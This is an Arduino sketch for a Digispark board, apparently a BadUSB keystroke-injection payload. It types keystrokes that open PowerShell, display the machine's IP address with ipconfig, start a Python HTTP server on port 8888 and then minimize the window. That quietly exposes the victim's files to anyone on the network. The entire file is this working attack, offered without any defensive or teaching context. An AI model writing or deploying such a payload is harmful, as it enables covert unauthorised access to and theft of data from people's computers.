#include "DigiKeyboard.h"
#define KEY_ARROW_DOWN      81
void setup() {

    delay(1);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);
    DigiKeyboard.print("powershell");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);
    DigiKeyboard.print("ipconfig");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(10000);
    DigiKeyboard.print("py -m http.server 8888");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN, MOD_GUI_LEFT);
    delay(500);
;}

void loop() {
  //empty
    
    
}
